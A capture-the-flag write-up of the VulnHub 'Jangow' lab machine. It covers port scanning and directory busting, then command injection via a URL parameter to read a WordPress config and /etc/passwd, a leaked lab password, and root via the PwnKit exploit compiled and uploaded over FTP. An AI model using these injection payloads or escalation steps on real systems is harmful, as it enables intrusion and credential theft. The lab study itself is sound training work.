# Jangow Machine
Machine Link: https://www.vulnhub.com/entry/jangow-101,754/

Starting with nmap scan

```
sudo nmap -T4 -p- -A 192.168.0.105
```

![nmap_scan](https://github.com/moataz-bellah/writeups/assets/47069499/779ba276-9017-476f-a4ae-87d74e3f682b)

We have 2 ports open ftp, http. I started with ftp and tried to login as anonymous, but i failed. Moving to http service and make some directory busting.

```
dirb http://192.168.0.105
```

I found one directory "site", let's go see it

![site](https://github.com/moataz-bellah/writeups/assets/47069499/27403bf4-ce2f-48b0-8a6c-9c6c820a7fa6)

It doesn't have too much, but there is "buscar" page that seems to be vulnerable to command injection. I tried to inject OS command like "ls".

```
http://192.168.0.105/site/busque.php?buscar=ls
```

![OS_Injectioni](https://github.com/moataz-bellah/writeups/assets/47069499/c5cd6035-67a6-451b-b5ed-f3c3b58133c7)

Great, we have remote code execution, we need to leverage that and get reverse shell. I tried many shells, but i realized this machine has a problem i can't figure out. I looked for more interesting
files and found wordpress/config.php

```
http://192.168.0.105/site/busque.php?buscar=cat wordpress/config.php
```

![config](https://github.com/moataz-bellah/writeups/assets/47069499/1c94e351-1e1f-4fc1-af2f-53867cd0e85e)

We have mysql credentials. I tried use it with ftp, but it didn't work. At least, we have a password. Let's try it with another user. Let's check /etc/passwd to see if there are any users

```
http://192.168.0.105/site/busque.php?buscar=cat+/etc/passwd
```

![passwd](https://github.com/moataz-bellah/writeups/assets/47069499/8d1f975d-3949-4a26-a3b4-07ec1f348d89)


I found "jangow01". Let's go login to ftp with username: "jangow01" password: "abygurl69". Great it worked. I tried to upload a php shell,but it is now allowed to upload any files in /var/www.
I had to login inside virtual box and it worked.

# Privilege Escalation

Surfing the internet, i found that link https://github.com/ly4k/PwnKit/blob/main/PwnKit.c. The machine's kernal has vulnerability can lead to privilege escalation. Using that link, i downloaded the exploit.
compile it

```
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```
We can upload it using ftp.

```
cd /home/jangow01
put Pwnkit
```

On the machine we have to make the file executable

```
chmod +x PwnKit
```

```
./PwnKit
```

![root](https://github.com/moataz-bellah/writeups/assets/47069499/455be079-8ee2-4410-92ce-910dad611cbe)

Great we root now














